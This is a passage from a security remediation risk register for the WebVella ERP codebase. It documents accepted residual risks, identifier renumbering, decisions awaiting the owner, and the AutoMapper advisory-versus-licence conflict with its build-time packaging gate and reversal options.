| `RISK-125` | The login form's two inputs carry no `autocomplete` attributes, so browsers emit an autofill advisory (`suggested: "current-password"`) and password managers are not steered. No functional and no security impact - `autocomplete` is absent, not disabled, so nothing suppresses a password manager. Fixing it is a presentation-layer enhancement with no confirmed finding behind it, which the audit plan's modification boundaries exclude. | Recommended, not fixed - out of remediation scope | Frontend maintainer |
| `RISK-126` | The startup transport-security check **refuses** a deployment only when the endpoints were declared and every one is plaintext; when **no** endpoint is declared it reports the identical diagnosis as a `warn:` line instead, because the endpoints then come from Kestrel's defaults or from host code the check cannot inspect. Measured in Production: with nothing declared this application binds `http://localhost:5000` alone, so that configuration does still answer HTTP 500 on `/login` - the warning is the notice, not a clean bill. Deliberate: refusing on an unknown posture could abort a deployment that would have worked. | Accepted - bounded residual of the transport-security check | Platform team |
| `RISK-127` | The third-party `wv-field-select` / `wv-field-multiselect` **display** path concatenates a stored option's `icon_class` and `color` straight into a `class` and a `style` attribute with no encoding. QA finding `F-R3-XSS` proved it live and **cross-host**. The **icon and colour half is now closed**: `SafeStyleValue` was promoted from `WebVella.Erp.Plugins.Project` into `WebVella.Erp.Web.Utils` and is applied in `ModelExtensions.ToWvSelectOption`, the single conversion boundary feeding all **94** call sites, which also closes the client-side select2 re-injection that server-side attribute encoding could not reach. **Two residuals remain.** First, `SelectOption.Label` is raw at the same vendor sink and is deliberately **not** encoded, because the component already encodes it in edit mode and encoding at the boundary would double-encode every legitimate label containing `&`, `'`, `<` or `>`. Second, the guard is caller-side, so any future code that constructs a `WvSelectOption` directly, or any future vendor sink that consumes another `SelectOption` member, reintroduces the exposure. This entry also corrects the record: `SafeStyleValue`'s original remarks claimed "four independent render paths"; there are **five**. | Icon/colour half **resolved**; `Label` channel and caller-side scope accepted with fix guidance | Platform team |
| `RISK-128` | The **24** informational findings from the cross-cutting runtime QA pass that raised `F-R3-XSS`. Every one is pre-existing in code this remediation never touched, and the pass proved that rather than asserting it: **zero** `.css` files changed by the project, the chart views and `login.cshtml` verified `UNCHANGED`, and the two widgets the remediation did edit emitting **byte-identical** avatar markup apart from an added `alt=""`. Eleven are already named by existing entries (`RISK-058`, `RISK-122`, `RISK-125`) and are cross-referenced rather than duplicated; the remaining thirteen are enumerated below with a recommended fix each. One is **security-adjacent** and worth reading first: there is no cross-process entity-metadata cache invalidation, and field permissions live in the same cached JSON, so a runtime permission tightening does not reach other host processes until they restart. One is a **positive** finding recorded so it is not later mistaken for a defect. The plan declines them all: minimal code changes only, no feature additions, no refactoring beyond security requirements, third-party libraries restricted to version updates, and fix only what is confirmed. | Documented for a future sprint | Platform team |






### Identifiers renumbered while consolidating this register

Several analyses were written independently and reused the same low identifiers for different
subjects. Where that happened the identifier cited from **source code** was treated as fixed and the
other subject was renumbered, so every citation in the codebase still resolves.

| Subject | Previously numbered | Now |
| --- | --- | --- |
| Static-analysis backlog kept as warnings | `RISK-003` | `RISK-024` |
| Content-Security-Policy ships report-only | `RISK-004` | `RISK-022` |
| Four by-design raw-output channels | `RISK-006` | `RISK-023` |
| Three anonymous routes share one per-address failure budget | `RISK-032` | `RISK-111` |
| Deterministic initialisation vector | `RISK-003` / `RISK-005` | `RISK-006` (cited from `CryptoUtility.cs`) |
| Credential hashing deviation | `RISK-005` | `RISK-003` |
| Login throttling is per-process | `RISK-006` | `RISK-008` |

**Four identifiers were left overloaded, deliberately, and here is how to read them.** `RISK-032`,
`RISK-033`, `RISK-034` and `RISK-035` each head **three** different entries in this register, because
three review passes allocated them independently. They were **not** renumbered. The reason is specific
rather than a preference for leaving things alone: these four identifiers are also cited from four other
documents in this repository, and several of those citations name subjects that have no detailed entry
here at all — a "PasswordField bound enforcement", a "re-narrowed deserialisation binder", a
"transport-level upload limit" and a "fifth live upload route" among them. Renumbering would silently
re-point those citations at whichever risk inherited the number, turning an ambiguity a reader can see
into an error a reader cannot. None of the four is cited from source code, so the rule stated above does
not force the issue either way.

Resolve them by **subject and section**, using this table:

| Identifier | Entry under *risks arising from the integrated controls* | Entry under the same section, later | Entry under *SMTP transport security* — **the one the summary table above indexes** |
| --- | --- | --- | --- |
| `RISK-032` | A dangerous URL scheme stored in a sitemap node URL survives HTML encoding | Ten authenticated API actions still return a stack trace in the response body | The `smtp_service` credential is not encrypted at rest |
| `RISK-033` | `ConvertDefaultValue` builds DDL default literals without escaping quotes | Provisioning emits six pre-existing bootstrap DDL statements | The SMTP certificate-validation opt-out survives in Development posture |
| `RISK-034` | SUPERSEDED — the taint-analysis family is not excluded | Plugin patches seed page-component options containing server-authored code | The permission migration preserves operator-created delegations |
| `RISK-035` | The taint-dataflow analyzer family runs, but intraprocedurally only | *(restated for a later pass under "residuals introduced by the continuous security review")* | Four residual observations recorded while closing the SMTP credential work |

A cross-reference from another document that does not match any cell above predates this consolidation
and should be resolved by its own surrounding text, not by the number.

**Two further index gaps, stated rather than papered over.** `RISK-108` through `RISK-111` have detailed
entries but no row in the summary table above; `RISK-012` and `RISK-015` through `RISK-020` have summary
rows but no detailed entry. Both halves are accurate where they appear — the gap is coverage, not
contradiction.

## Open decisions

### Decisions awaiting the repository owner — consolidated and actionable

Every decision below is **outside engineering's authority to settle**. Each is recorded with the exact
mechanical steps for each option, so that acting on it requires a decision and not a fresh
investigation. Nothing here is blocked on further analysis; all of them are blocked on a choice.

| # | Decision | Owner | Blocking effect while undecided | Detail |
| --- | --- | --- | --- | --- |
| 1 | **`AutoMapper` licence** — accept the Reciprocal Public License 1.5 (or the vendor's commercial agreement) for `[15.1.3]`, **or** decline it and take the documented narrow-suppression fallback | Repository owner / legal — a licensing and product-distribution decision, not an engineering one | The product links a dependency whose licence is **incompatible with its own declared `Apache-2.0` distribution posture**. The security advisory is closed and the build gate is green, so nothing fails loudly *at build time* — which is exactly how this came to be recorded as decided by Engineering, and why `CR2-F-04` reopened it. It is now enforced instead of merely disclosed: `dotnet pack` fails with `ERPLIC001` until the answer is recorded in `ErpAutoMapperLicenceDecision`, so the question blocks **publishing** and nothing else. Executing either answer is a one-property change plus, for the decline, the documented pin reversal | `RISK-001` below, [`WebVella.Erp/WebVella.Erp.csproj`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/WebVella.Erp/WebVella.Erp.csproj) (the gate and both licence comments), and [`LIBRARIES.md`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/LIBRARIES.md) |
| 2 | **Content-Security-Policy promotion** — approve the staged route to enforcement and accept its component-level work, **or** formally defer enforcement | Application security owner **and** frontend maintainer, jointly | The mandated header set is emitted but the content policy is **detective, not preventive**. The by-design markup channels retained under `RISK-023` and `RISK-032` therefore rest on the privileged markup-authoring contract alone | `RISK-022`, and the rollout in [the secure configuration guide](secure-configuration.md) |
| 3 | **Non-solution project coverage** — approve the current explicit per-project scanning, **or** authorise adding `WebVella.Erp.WebAssembly/Server` and `/Shared` to `WebVella.ERP3.sln` | Repository owner / build owner | None. Coverage is already continuous at 17 + 2 = 19 via explicit per-project steps in the workflow. The decision is only whether to simplify it to one command; the projects' frozen file contracts currently forbid changing solution membership | [`LIBRARIES.md`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/LIBRARIES.md), *How to reproduce this inventory* |
| 4 | **Historical commit atomicity** — acknowledge that the mandated commit ordering and one-class-per-commit grouping were not met on parts of this branch's history | Repository owner | None technically; the integrated tree is correct. The acknowledgement is a process record and **cannot convert the failed checklist items into passes** | [the remediation log](remediation-log.md), *Commit atomicity and ordering* |
| 5 | **Builder-layer encoding for `H-06`** — authorise editing `WebVella.Erp.Web/Models/BaseErpPageModel.cs` and the three Project widget composers | Repository owner | The residual for the ten retained markup channels stays open. Those files sit outside the authorised locator set for this change | `RISK-032` |

**Decision 1 is the only one with a legal dimension, and it is the one most easily lost.** Its two
options have concrete, opposite mechanical consequences, so both are written out in full below rather
than summarised: option A changes nothing in the repository and changes the product's licensing
obligations; option B changes two files and reopens a High-severity advisory behind a justified,
negative-tested suppression. There is no third option that is both patched and permissively licensed,
because the advisory is first patched at `15.1.1` and that version already carries the new terms.

### RISK-001 — `AutoMapper` 15.1.3 licence conflicts with the declared project licence

| Field | Value |
| --- | --- |
| **Status** | **Open — PENDING OWNER RATIFICATION, and mechanically blocked from shipping meanwhile.** The security advisory is closed and stays closed. The licence question is *not* decided and is not decidable here: `dotnet pack` fails until the owner records an answer, so the unresolved question cannot reach nuget.org by accident. |
| **Related finding** | H-01 (CWE-674, GHSA-rvv3-g6hj-g44x / CVE-2026-32933, OWASP A06:2021), and review finding `CR2-F-04`, which found this entry claiming the decision had been taken. |
| **Owner** | **Repository owner / legal.** Engineering owns the technical disposition — the pin, the gate, the reversal path — and has taken it. It does **not** own, and must not appear to own, whether this product may distribute packages that link Reciprocal Public License 1.5 code while declaring `Apache-2.0`. |

**What the conflict is.** Closing H-01 requires moving `AutoMapper` off every version below
`15.1.1`, because that is where the advisory is first patched. Version `14.0.0` declares the MIT
licence (`automapper.nuspec`: `<license type="expression">MIT</license>`). From the patched line
onwards the package instead ships a licence file (`<license type="file">LICENSE.md</license>`) that
places the code under the **Reciprocal Public License 1.5**, with a separate commercial licence
agreement offered as the alternative. The core project declares
`<PackageLicenseExpression>Apache-2.0</PackageLicenseExpression>`, ships a matching licence file and
publishes packages for third-party consumption. A reciprocal licence's source-disclosure obligation
is not compatible with that distribution posture, and there is no patched permissive line to fall
back to — the fix begins at `15.1.1`, already under the new terms.

**A correction this entry has to make about itself.** An earlier revision recorded the Status as
*"Decided — advisory closed; licence obligation accepted as a residual"*, with Engineering named as the
deciding party. Review finding `CR2-F-04` rejected that, and rightly: accepting a reciprocal-licence
obligation on a product that publishes packages for third-party consumption **is** changing that
product's effective licence posture, and the governing plan is explicit that an automated remediation
must escalate that rather than absorb it. Recording it as decided was absorption wearing the vocabulary
of disclosure. The Status is corrected to open, and — because a register entry alone is exactly the kind
of disclosure that gets skimmed — the consequence is now **enforced in the build** rather than only
written down. This correction is made in place, not appended, for the same reason the coverage
corrections were: an entry that quietly restates its own disposition is the failure being reported.

**Current state of the repository.** The pin is `[15.1.3]`, so the security advisory is closed and the
dependency gate is green with **no suppression declared anywhere**. The declared licence expression was
**not** changed and no `PackageLicenseFile` was substituted for it — deliberately, because rewriting it
would be the agent settling the owner's question by another route. The technical disposition, and the two resolutions set out
below, rest on the three verified facts recorded further down; none of them settles the licence question.

**Exactly two resolutions are permitted, and both require the owner.**

1. **Ratify the licence.** Accept the Reciprocal Public License 1.5, or take the vendor's commercial
   agreement, and align what the published packages declare — keep `Apache-2.0` only if legal review
   confirms it is defensible alongside an RPL-1.5 dependency, otherwise relicense or declare the
   commercial cover. Then the pin stays at `[15.1.3]` unchanged and this entry moves to *accepted*.
2. **Decline the licence and take the documented fallback.** Hold the pin at the permissively licensed
   `[14.0.0]` behind a single narrowly scoped audit suppression carrying an inline justification, plus a
   formal recorded risk acceptance of `GHSA-rvv3-g6hj-g44x`. The full mechanics, and the cost — it
   disables the CI negative control for advisory enforcement — are set out under *reversal path* below.

**What must NOT happen**, recorded because both are tempting shortcuts: the pin must not be silently
reverted to a vulnerable `14.x` without that recorded acceptance, and the High advisory must not be
suppressed to make the gate green while leaving the licence question unanswered. Either would trade a
documented legal exposure for an undocumented security one.

**The exploitability assessment that informs the choice.** The advisory is rated High, but real-world
exposure in *this* repository is low, and that asymmetry is the whole reason option 2 is even viable:
every mapping is statically declared in source, and no user-controlled mapping configuration or type
graph reaches the configuration builder, so the uncontrolled-recursion path is reachable only through a
self-referential mapping a developer would have to author deliberately. This is an argument about
*priority*, not an argument that the advisory can be ignored — it is tracked separately as `RISK-002`.

Three verified facts constrain the decision.

1. **There is no permissive escape.** The advisory's affected ranges are `< 15.1.1` and
   `>= 16.0.0, < 16.1.1`, so the lowest patched version is `15.1.1`. `14.0.0` is the last `14.x`
   release — there is no `14.0.1` — and the `.nuspec` of `15.0.0`, `15.1.1` and `15.1.3` each declare a
   licence **file** resolving to the Reciprocal Public License 1.5. Every patched version is
   reciprocal-licensed, so "upgrade to a patched MIT release" is not an available option.
2. **The reversal path would now disable the gate that proves the gate works.** Retaining `14.0.0`
   requires suppressing `NU1903`. Because `AutoMapper` is present transitively in 16 project graphs, a
   project-scoped suppression is insufficient — measured at exactly 15 residual `NU1903` errors. The
   only placement that works is repository-wide, and `Directory.Build.props` is **directory-scoped**, so
   a repository-wide suppression is also inherited by the CI negative-control probe. That probe
   deliberately pins `AutoMapper 14.0.0` and *requires* its restore to fail; suppression would silence
   it and remove the only evidence that Gate 2 can fail at all. Verified by evaluating the probe's
   inherited properties (`NuGetAudit=true`, `NuGetAuditMode=all`, `NuGetAuditLevel=low`,
   `WarningsAsErrors` containing `NU1903`) and confirming its restore still exits non-zero with
   `error NU1903`.
3. **The reciprocity obligation is already satisfied in substance here.** RPL 1.5's operative
   requirement is disclosure of source; this repository's source is public. What genuinely remains is
   narrower than the licence question as a whole: the licence **declared** to third-party consumers of
   the published packages.

That last point is the item awaiting owner ratification. It is a distribution question rather than a
code-security one, and the *security* posture does not wait on it — the advisory is closed either way.
What does wait on it is **publishing**, and that is now enforced rather than requested.

**How it is mechanically blocked — the part that makes this entry more than a note.** The target
`ErpAssertAutoMapperLicenceDecisionRecorded` in **`Directory.Build.props`** fails `dotnet pack`
while the decision is unrecorded, so no package carrying an unratified licence claim can be published by
accident. Publishing is the only irrevocable step — a package version cannot be recalled from nuget.org
once consumers have resolved it — so it is the only step gated. `restore`, `build`, `publish`, `run`,
`dotnet list package` and every CI gate step are deliberately **unaffected**: blocking those would break
the security validation this remediation depends on and would penalise developers for a question they
cannot answer.

**Where the gate lives, and why it moved.** It was first written in
`WebVella.Erp/WebVella.Erp.csproj`, which is where this finding points — and that placement left it
**bypassable**. Four manifests in this repository declare
`<PackageLicenseExpression>Apache-2.0</PackageLicenseExpression>` and publish to nuget.org:
`WebVella.Erp`, `WebVella.Erp.Web`, `WebVella.Erp.Plugins.Mail` and `WebVella.Erp.Plugins.SDK`. The
other three each hold a `ProjectReference` to the core, so each ships a package dependency that reaches
`AutoMapper`. That was measured rather than suspected: with the gate in the core manifest only, packing
each of the other three exited **0** and produced a package, and the resulting
`WebVella.Erp.Web.nuspec` was read directly — it carries
`<license type="expression">Apache-2.0</license>` beside `<dependency id="WebVella.Erp" …>`. Moving the
target into `Directory.Build.props`, which every project beneath the repository root imports, closes all
four with one definition. A gate that guards one of four doors is not a gate.

Verified in ten directions across all four packable manifests — 26 invocations, none assumed:

| Invocation | Result |
| --- | --- |
| `dotnet restore` (solution) | exit 0, gate silent |
| `dotnet build` (core and web) | exit 0, gate silent, warning set byte-identical to the pre-change baseline |
| `dotnet publish` (a site host) | exit 0, gate silent |
| `dotnet list package --vulnerable` | exit 0, gate silent |
| `dotnet pack` with no decision recorded, **each of the four packable manifests** | **exit 1, `error ERPLIC001`, no `.nupkg` produced — 4 of 4** |
| `dotnet pack -p:ErpAutoMapperLicenceDecision=accepted-rpl-1.5`, each of the four | exit 0, `.nupkg` produced, with a high-importance notice to confirm the declared expression before publishing — 4 of 4 |
| `dotnet pack -p:ErpAutoMapperLicenceDecision=declined-rpl-1.5`, each of the four | **exit 1, `error ERPLIC002` — 4 of 4** — declining is not complete until the pin is reverted, because the declaration would still be inaccurate |
| `dotnet pack -p:ErpAutoMapperLicenceDecision=yes`, each of the four | **exit 1, `error ERPLIC003` — 4 of 4** — an unrecognised value is refused rather than ignored, so a typo cannot be mistaken for consent |
| the pinned version declared permissive (core and web) | exit 0, `.nupkg` produced, reporting no conflict — the gate disables itself when it stops applying |
| the core manifest made unreadable | **exit 1, `error ERPLIC004`, no `.nupkg` produced** — the gate refuses to pass when it cannot read its own input, so renaming or moving that manifest disables *packaging* rather than silently disabling the *gate* |

Two properties of the design are worth stating because they are what make it hard to defeat by accident.

*It reads one fact, in one place.* The pinned version is read out of the core manifest with `XmlPeek` at
pack time, so every packable project is judged against the same pin rather than against its own view of
the graph — and `ERPLIC004` means a failure to read that fact is a failure to pack.

*The conflict is detected, not hard-coded.* The gate compares the version it read against
`ErpPermissiveAutoMapperVersions`, which lists every release published under a permissive expression —
today `[14.0.0]` and `14.0.0`, the last MIT release. If AutoMapper ever publishes a patched permissively
licensed version and the pin moves to it, adding that version to the list is a reviewed edit and packing
then proceeds with no property at all. One practical note: override that list by editing the file rather
than from the command line, because MSBuild treats `;` as a command-line property separator and the
semicolons must otherwise be escaped as `%3B`.

**Scope errs deliberately towards over-inclusion.** The gate applies to any project declaring a licence
expression, not only to those with a direct reference to the core. Over-inclusion costs one property on a
pack an owner has to authorise anyway; under-inclusion costs an irrevocable publication.

**Documented fallback, retained for reversibility but no longer recommended.** Retain `14.0.0` behind a
narrowly scoped dependency-audit suppression carrying an inline justification, together with a formal
recorded risk acceptance. It is recorded in full because a reversible decision is worth more than an
irreversible one, but reason 2 above is why it is not the shipping choice: taking it now costs the
negative control. The acceptance rests on the following exploitability assessment: every
mapping is statically declared in source, and no user-controlled mapping configuration or type
graph reaches the configuration builder, so the recursion path is reachable only through a
self-referential mapping the developers themselves would have to author. Real-world exposure is
therefore low despite the High rating. The fallback keeps the build gate green without pretending
the advisory does not exist.

**Options, stated plainly — and what each one costs the owner to execute.**

1. **Accept the upgrade** and reconcile the product's licensing position with the Reciprocal Public
   License 1.5 (or obtain the vendor's commercial licence). *To execute:* decide whether the published
   packages keep declaring `Apache-2.0`, are relicensed, or are covered by the vendor's commercial
   agreement; adjust `PackageLicenseExpression` in `WebVella.Erp/WebVella.Erp.csproj` if the answer is
   relicensing; then pack with `-p:ErpAutoMapperLicenceDecision=accepted-rpl-1.5`, or set that property in
   the project once the answer is settled. Nothing else changes: the advisory stays closed and no
   suppression is introduced. **This is the option the repository is currently configured for in every
   respect except ratification.**
2. **Decline the upgrade** and apply the documented fallback above — suppression plus formal, justified
   risk acceptance. *To execute:* follow the two reversal analyses that follow this entry, which give the
   exact file, line and property changes. Be clear about the price, because it is higher than it looks:
   restoring `14.0.0` reopens a High-severity advisory, and the only suppression placement that works is
   repository-wide, which is also inherited by the CI negative-control probe — so the fallback costs the
   single piece of evidence that Gate 2 can fail at all. Recording `declined-rpl-1.5` while the RPL pin is
   still in place fails the pack deliberately (`ERPLIC002`), so a half-executed decline cannot ship.
3. **Replace the dependency.** Not recommended on cost grounds: the platform declares hundreds of
   mappings across its profiles, so removing the library means hand-writing them, which is far
   beyond a security remediation.

**What must not happen, and is now prevented.** A fourth path exists in practice and is the one this
finding was raised about: publish the package as-is, with an unratified `Apache-2.0` claim over
RPL-licensed code, because the build was green and nothing objected. That path is closed —
`ERPLIC001` — and closing it is the whole point of preferring a mechanical block to a paragraph.


### RISK-001, the two reversal analyses

Both analyses below argue the **alternative** disposition — retaining `[14.0.0]` behind a single,
negative-tested, per-advisory suppression. Neither is what shipped; the pin is `[15.1.3]` and no
suppression is declared. **Nothing in either analysis is in force, and neither is a decision.** They are
kept in full because they are the executable reversal path this entry needs in order to remain
reversible, and because their exploitability assessment and negative-control evidence hold under either
disposition.

*A note on the labels, because the two analyses were written at different times and name the same two
choices differently.* "Option 1" and "Option A" both mean **accept the upgrade** — the state the tree is
in, awaiting ratification. "Option 2" and "Option B" both mean **decline it and hold `[14.0.0]` behind a
suppression**. They map onto options 1 and 2 of the main entry above. Where a heading or field below
reads as though the declining branch were applied, that is the analysis speaking in its own voice about a
state that does not exist in this tree.

### RISK-001, reversal path — accepting the advisory rather than the licence change

| Field | Value |
| --- | --- |
| **Status** | *(Reversal analysis — **not** the shipped disposition, and **not** a decision. The tree at this commit pins `[15.1.3]` and declares no suppression; see the note above this heading.)* **Nothing in this block is in force.** What it argues, in its own voice, is Option 2: hold the version at `[14.0.0]`, suppress the advisory narrowly and explicitly, and leave the licensing posture untouched. It is written out in full so that Option 2 is an executable plan rather than a gesture. |
| **Related finding** | H-01 (CWE-674, GHSA-rvv3-g6hj-g44x / CVE-2026-32933, OWASP A06:2021), and review finding `CR2-F-04` |
| **Argued by** | The remediation, as the conservative branch — *argued*, not decided. An earlier revision headed this field "Decided by", which `CR2-F-04` rejected: the choice *between* the two options is a licensing and product-distribution decision reserved to the repository owner. What is true, and is why the branch was written out at all, is that Option 2 is the one that leaves the owner's decision untaken — it preserves the declared `Apache-2.0` expression, the shipped `LICENSE.txt` and the published package terms exactly as the owner set them, whereas Option 1 requires the owner to ratify them. |
| **Owner action available** | Either branch requires a positive owner decision; neither is a default. Option 1 accepts reciprocal licence terms (or buys the vendor's commercial licence); Option 2 accepts a High-severity advisory instead, and costs the CI negative control. Until one is recorded, the tree stays in Option 1's code state and `ERPLIC001` refuses to package it. |

**What the conflict is.** Closing H-01 requires moving `AutoMapper` off every version below
`15.1.1`, because that is where the advisory is first patched. Version `14.0.0` declares the MIT
licence (`automapper.nuspec`: `<license type="expression">MIT</license>`). From the patched line
onwards the package instead ships a licence file (`<license type="file">LICENSE.md</license>`) that
places the code under the **Reciprocal Public License 1.5**, with a separate commercial licence
agreement offered as the alternative. The core project declares
`<PackageLicenseExpression>Apache-2.0</PackageLicenseExpression>`, ships a matching licence file and
publishes packages for third-party consumption. A reciprocal licence's source-disclosure obligation
is not compatible with that distribution posture, and there is no patched permissive line to fall
back to — the fix begins at `15.1.1`, already under the new terms.

**The state this analysis describes — which is *not* the state of the repository.** The pin is held at `[14.0.0]`. The advisory is closed by an
explicit, narrowly scoped dependency-audit suppression naming exactly one advisory — declared once,
in `Directory.Build.props`, alongside an inline justification — paired with this formal acceptance.
No severity class is suppressed wholesale, nothing else in the repository is suppressed at all, the
declared licence expression is unchanged, and `WebVella.Erp/Api/Models/AutoMapper/ErpAutoMapper.cs`
is byte-identical to its pre-audit form. The dependency gate is therefore green **on the redefined
criterion that applies to this branch: no *unsuppressed* High or Critical advisory**, with the one
suppression accompanied by this record. The suppression is declared with the audit policy it
qualifies rather than in a project manifest, because `AutoMapper` reaches sixteen projects
transitively and the audit covers transitive packages; it therefore lands with the **Scan Gate
Enforcement** class in the [remediation log](remediation-log.md), which also carries the negative
control proving that removing this one suppression turns the advisory back into a build failure.

**Why the residual risk is acceptable.** Every mapping in this platform is declared statically in
source — 379 `CreateMap<...>` declarations across 32 `Profile` subclasses — and no user-controlled
mapping configuration or type graph ever reaches the configuration builder. The recursive path is
therefore reachable only through a self-referential mapping that the project's own developers would
have to author deliberately, in source, and then ship. It is not reachable by an external actor. The
impact class is availability (stack exhaustion terminating the host process), not disclosure and not
code execution. Real-world exposure is low despite the High rating.

**What this acceptance does not claim.** It does not claim the advisory is inapplicable, and it does
not claim the code is unaffected. The vulnerable version is present and the suppression is visible
in the build configuration precisely so that the acceptance cannot be mistaken for a clean scan.

**Options, stated plainly.**

1. **Accept the upgrade** and reconcile the product's licensing position with the Reciprocal Public
   License 1.5 (or obtain the vendor's commercial licence). Not the branch this block argues for — see
   *Argued by* above. In the shipped tree **neither option has been taken**: the code sits in Option 1's
   state, the licensing question is unanswered, and `ERPLIC001` refuses to package it. The status field
   at the top of `RISK-001` governs; nothing in this block does.
2. **Decline the upgrade** and apply the documented fallback — suppression plus formal, justified
   risk acceptance. ◻ **The branch this block argues for — and not taken in the shipped tree either.**
   An earlier revision marked this option "✅ Taken", which `CR2-F-04` withdrew: no suppression exists
   anywhere in the build configuration, which is checkable, and the pin is at `[15.1.3]`.
3. **Replace the dependency.** Not recommended on cost grounds: the platform declares hundreds of
   mappings across its profiles, so removing the library means hand-writing them, which is far
   beyond a security remediation.

**Exact mechanical steps for each option.** Written out so that executing the decision needs no
re-investigation, and so that the cost of each option is visible before it is chosen.

*Option A — accept the upgrade (this is the current shipped state; no repository change is required).*
Nothing in the tree changes. What changes is the product's licensing obligation: the maintainers accept
that the distributed product incorporates Reciprocal Public License 1.5 code, or they obtain the
vendor's commercial licence. If accepted, record the acceptance and its date in this entry, set the
**Status** field to `Accepted`, and reconcile `LICENSE.txt` and the `PackageLicenseExpression`
declarations with whatever position legal settles on. **Do not** leave the `Apache-2.0` expression
standing unexamined alongside an accepted reciprocal dependency — that is the state this entry exists
to prevent.

*Option B — decline the upgrade and take the documented fallback.* **Two files, three edits.** Verified
against the tree at this commit:

1. `WebVella.Erp/WebVella.Erp.csproj:L88` — change `Version="[15.1.3]"` back to `Version="[14.0.0]"`.
   The locator has moved twice as the escalation comment above the pin grew, so search for
   `PackageReference Include="AutoMapper"` rather than trusting the line number.
   Keep the exact-version bracket form; a floating range would silently re-acquire the licence change.
2. `WebVella.Erp/Api/Models/AutoMapper/ErpAutoMapper.cs:L23` — drop the second constructor argument,
   returning `new Mapper(new MapperConfiguration(cfg))`, and remove the now-unused
   `Microsoft.Extensions.Logging.Abstractions` using. The `ILoggerFactory` parameter exists only
   because the 15.x constructor requires it.
3. `Directory.Build.props` — declare the suppression. The sanctioned shape is already present as an
   intentionally inert commented seam at `:L448-L459` — a locator that had drifted twice before this
   revision, so search for the words `SUPPRESSION SEAM` rather than trusting the line number; the
   narrowest correct form is a
   `NuGetAuditSuppress` entry naming the advisory URL
   `https://github.com/advisories/GHSA-rvv3-g6hj-g44x`, which suppresses **that one advisory** rather
   than every `NU1903` in the repository. Prefer it over the commented `NoWarn` example for exactly
   that reason. Whichever form is used, it must carry an inline justification and a back-reference to
   this entry.

   **Note what does *not* need to change.** `ErpAutoMapper.Initialize` takes only a
   `MapperConfigurationExpression`; the no-op logger factory is constructed inside it. So the two
   initialisation call sites — `WebVella.Erp.Web/ErpMvcExtensions.cs:L192` and
   `WebVella.Erp.ConsoleApp/Program.cs:L102` — are **unaffected**, as are the 379 mapping
   declarations and every projection call site. The revert is genuinely two files.

*Consequence of Option B, stated without softening.* A **High**-severity advisory
(`GHSA-rvv3-g6hj-g44x`, CWE-674) is knowingly reintroduced into the dependency graph, and Validation
Gate 2's pass criterion changes from "no High or Critical rows" to "no **unsuppressed** High or
Critical rows". That is a real reduction in posture, justified only by the exploitability assessment
above, and it requires a named accepter and a date recorded in this entry. The suppression must also be
**negative-tested** — confirm that removing it makes the restore fail again — because an untested
suppression is indistinguishable from a gate that has quietly stopped working.

*Provisional state until the owner decides.* **Option A is in force by default**, because the security
advisory had to be closed and the alternative was to ship a known High-severity vulnerability. This is
a provisional engineering disposition taken to keep the gate green, **not** an acceptance of the
licence on the owner's behalf. The declared `Apache-2.0` expression was deliberately left unchanged so
that the conflict remains discoverable rather than papered over in either direction.

**An earlier revision of this entry ended with a "reversal procedure, if the owner takes Option 1"
that no longer applies, and it is removed rather than left to mislead.** That procedure described
moving *to* `[15.1.3]` from a retained `[14.0.0]`, supplying the logger factory, and deleting an
`AutoMapper` suppression from `Directory.Build.props`. All three of those steps are already done —
the pin is `[15.1.3]`, `ErpAutoMapper` supplies `NullLoggerFactory.Instance`, and there is no
suppression of any kind anywhere in the repository to delete. Only the fourth step survives, and it
is not a reversal: reconciling
`<PackageLicenseExpression>Apache-2.0</PackageLicenseExpression>`, the shipped `LICENSE.txt` and the
published package terms with the reciprocal obligation is exactly the ratification Option A asks the
owner for, and `ERPLIC001` refuses to produce a package until it happens.

**Review trigger.** Re-open — or close — this entry if any of the following becomes true: the owner
records a decision, which is what this entry exists to obtain; a patched AutoMapper release appears
under a permissive licence, which would remove the conflict entirely and make Option B costless;
user-controlled mapping configuration is introduced anywhere in the platform, which would change the
exploitability assessment above; or the project stops publishing packages for third-party
consumption, which would remove the distribution posture that makes this an owner question at all.

### RISK-001, reversal path — holding the pin at the permissively licensed version

| Field | Value |
| --- | --- |
| **Status** | *(Reversal analysis — **not** the shipped disposition, and **not** a decision. The tree at this commit pins `[15.1.3]` and declares no suppression; see the note above this heading.)* **Nothing in this block is in force.** It is written out in full so that Option B is an executable plan rather than a gesture: if the owner ever chooses it, this is the acceptance they would be ratifying — the advisory knowingly retained, disclosed and gated. An earlier revision of this row asserted that acceptance as **decided**, which `CR2-F-04` rejected. |
| **Decision** | Hold the pin at `[14.0.0]` (MIT). Do **not** upgrade. Accept the advisory with a narrowly scoped audit suppression and this formal acceptance. |
| **Related finding** | H-01 / H-11 (CWE-674, GHSA-rvv3-g6hj-g44x / CVE-2026-32933, **High**, OWASP A06:2021) |
| **Owner** | Recorded by the remediation on the reasoning below. The *reversal* is a repository-owner and legal decision. |

**What the conflict is.** Closing this advisory requires moving `AutoMapper` off every version below
`15.1.1`. Version `14.0.0` declares the MIT licence
(`<license type="expression">MIT</license>`). From the patched line onwards the package ships a
licence file placing the code under the **Reciprocal Public License 1.5**, with a commercial licence
agreement offered as the alternative. The core project declares
`<PackageLicenseExpression>Apache-2.0</PackageLicenseExpression>`, ships a matching licence file and
publishes packages to nuget.org for third-party consumption. A reciprocal licence's
source-disclosure obligation is not compatible with that distribution posture.

**There is no patched permissive line to fall back to.** This was verified against the package
registry rather than assumed. AutoMapper has 235 published versions; the `.nuspec` of **every**
patched version was read, and `15.1.1`, `15.1.2`, `15.1.3`, `16.1.1` and `16.2.0` are **all** under
the Reciprocal Public License 1.5. Only `14.0.0` and earlier are MIT. The choice was therefore never
"patched versus unpatched at equal licensing cost" — it was "unpatched under MIT, or patched under a
reciprocal licence".

**Why the decision went this way.** An automated remediation must not change the effective licence of
someone else's published product in order to close an advisory. Upgrading would have traded a
low-exploitability denial-of-service advisory for a substantive, irreversible change to the product's
licensing posture affecting every downstream consumer of its published packages. Leaving the question
open was also untenable: the dependency gate promotes advisory diagnostics to build errors, so an
undecided licensing question means an indefinitely red build — and a red build is where genuinely new
advisories go unnoticed.

**Exploitability assessment supporting acceptance.** The High rating is not disputed; what is assessed
is reachability in *this* codebase:

* All 379 `CreateMap<...>` declarations across 32 `Profile` subclasses are **statically declared in
  source** and compiled into the assembly. None is built from configuration, user input, or reflection
  over an untrusted type graph.
* There is exactly **one** `new MapperConfiguration(...)` site in the repository, invoked from two
